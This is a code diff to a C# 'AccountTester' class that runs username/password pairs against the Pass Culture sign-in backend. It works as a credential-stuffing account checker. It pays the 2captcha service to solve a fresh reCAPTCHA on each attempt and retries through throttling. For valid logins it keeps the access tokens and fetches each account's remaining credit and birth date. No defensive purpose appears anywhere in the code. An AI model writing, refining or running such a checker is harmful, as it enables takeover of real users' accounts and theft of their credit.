@@ -12,7 +12,7 @@ namespace DataVortex.Core.Accounts;
 /// </summary>
 public static class AccountTester
 {
-    private const int MaxRateLimitRetries = 5;
+    private const int MaxCheckRetries = 3; // extra attempts on non-definitive responses (so up to 4 total)
     private static volatile SemaphoreSlim _gate = new(10, 10);
     private static int _maxParallel = 10;
     private static ILogger? _log;
@@ -52,56 +52,70 @@ public static class AccountTester
         await gate.WaitAsync(ct).ConfigureAwait(false);
         try
         {
-            // Solve the captcha ONCE per account and reuse the token across 429 retries, so a rate-limited
-            // account never spends more than one captcha. Passing a non-null token stops SignInAsync from
-            // solving again internally.
-            _log?.LogInformation("Check {Email}: demande d'un captcha à 2captcha", cred.Username);
-            var captcha = await passClient.SolveCaptchaAsync(ct).ConfigureAwait(false);
-            _log?.LogInformation("Check {Email}: captcha {State}", cred.Username, captcha is null ? "NON résolu" : "résolu");
-
             for (int attempt = 0; ; attempt++)
             {
-                _log?.LogInformation("Check {Email}: POST signin → backend Passculture (essai {Attempt})", cred.Username, attempt + 1);
-                var signin = await passClient.SignInAsync(cred.Username ?? "", cred.Password ?? "", captcha, ct).ConfigureAwait(false);
-
-                // No HTTP response (network error) or rate-limited (429): do NOT record a result.
-                if (signin.StatusCode == 0 || signin.StatusCode == 429)
+                if (attempt > 0)
                 {
-                    // 429 = backend throttling: back off and retry, keeping the reservation + the gate slot.
-                    if (signin.StatusCode == 429 && attempt < MaxRateLimitRetries)
-                    {
-                        var delay = TimeSpan.FromSeconds(Math.Min(60, 2 * Math.Pow(2, attempt))); // 2,4,8,16,32s
-                        _log?.LogWarning("Check {Email}: HTTP 429 (throttle), nouvel essai dans {Delay}s ({Attempt}/{Max})",
-                            cred.Username, (int)delay.TotalSeconds, attempt + 1, MaxRateLimitRetries);
-                        await Task.Delay(delay, ct).ConfigureAwait(false);
-                        continue;
-                    }
-                    _log?.LogWarning("Check {Email}: abandonné (HTTP {Code}) — réessayable plus tard", cred.Username, signin.StatusCode);
-                    registry.Release(cred.Username, cred.Password); // free it so it can be retried later
+                    // Backoff before retrying a non-definitive response (429 / 5xx / network / captcha failure).
+                    var delay = TimeSpan.FromSeconds(Math.Min(30, 2 * Math.Pow(2, attempt - 1))); // 2,4,8,…
+                    await Task.Delay(delay, ct).ConfigureAwait(false);
+                }
+
+                // A reCAPTCHA token is single-use, so we solve a FRESH captcha for every attempt.
+                _log?.LogInformation("Check {Email}: demande d'un captcha à 2captcha (essai {Attempt})", cred.Username, attempt + 1);
+                var captcha = await passClient.SolveCaptchaAsync(ct).ConfigureAwait(false);
+                if (captcha is null)
+                {
+                    _log?.LogWarning("Check {Email}: captcha non résolu (essai {Attempt})", cred.Username, attempt + 1);
+                    if (attempt < MaxCheckRetries) continue;
+                    registry.Release(cred.Username, cred.Password);
                     return cred;
                 }
 
-                decimal? credit = null;
-                string? birth = null;
-                if (signin.Success && signin.AccessToken is not null)
+                _log?.LogInformation("Check {Email}: POST signin → backend Passculture (essai {Attempt})", cred.Username, attempt + 1);
+                var signin = await passClient.SignInAsync(cred.Username ?? "", cred.Password ?? "", captcha, ct).ConfigureAwait(false);
+
+                // Definitive outcomes only: 200 = valid account, 400 = wrong password. Anything else → retry.
+                if (signin.StatusCode == 200 || signin.StatusCode == 400)
                 {
-                    try
+                    var success = signin.StatusCode == 200;
+                    decimal? credit = null;
+                    string? birth = null;
+                    if (success && signin.AccessToken is not null)
                     {
-                        var me = await passClient.GetMeAsync(signin.AccessToken, ct).ConfigureAwait(false);
-                        credit = me.DomainsCreditRemaining;
-                        birth = me.BirthDate;
+                        try
+                        {
+                            var me = await passClient.GetMeAsync(signin.AccessToken, ct).ConfigureAwait(false);
+                            credit = me.DomainsCreditRemaining;
+                            birth = me.BirthDate;
+                        }
+                        catch { /* credit/birth are best-effort */ }
                     }
-                    catch { /* credit/birth are best-effort */ }
+
+                    _log?.LogInformation("Check {Email}: ← HTTP {Code} → {Verdict}{Credit}",
+                        cred.Username, signin.StatusCode,
+                        success ? "VALIDE" : "mot de passe incorrect",
+                        success ? $" (crédit={credit})" : "");
+
+                    var result = new AccountTestResult(
+                        success, signin.StatusCode, signin.AccessToken, signin.RefreshToken,
+                        credit, birth, signin.Raw, DateTime.UtcNow);
+                    registry.Complete(cred.Username, cred.Password, result);
+                    return Apply(cred, result);
                 }
 
-                _log?.LogInformation("Check {Email}: ← réponse HTTP {Code} success={Success} crédit={Credit}",
-                    cred.Username, signin.StatusCode, signin.Success, credit);
+                // Non-definitive (429 / 5xx / 0 / …) → retry up to the cap, else give up (retryable later).
+                if (attempt < MaxCheckRetries)
+                {
+                    _log?.LogWarning("Check {Email}: HTTP {Code} (non définitif) → nouvel essai ({Attempt}/{Max})",
+                        cred.Username, signin.StatusCode, attempt + 1, MaxCheckRetries);
+                    continue;
+                }
 
-                var result = new AccountTestResult(
-                    signin.Success, signin.StatusCode, signin.AccessToken, signin.RefreshToken,
-                    credit, birth, signin.Raw, DateTime.UtcNow);
-                registry.Complete(cred.Username, cred.Password, result);
-                return Apply(cred, result);
+                _log?.LogWarning("Check {Email}: abandonné après {Total} essai(s) (dernier HTTP {Code}) — réessayable plus tard",
+                    cred.Username, MaxCheckRetries + 1, signin.StatusCode);
+                registry.Release(cred.Username, cred.Password);
+                return cred;
             }
         }
         catch
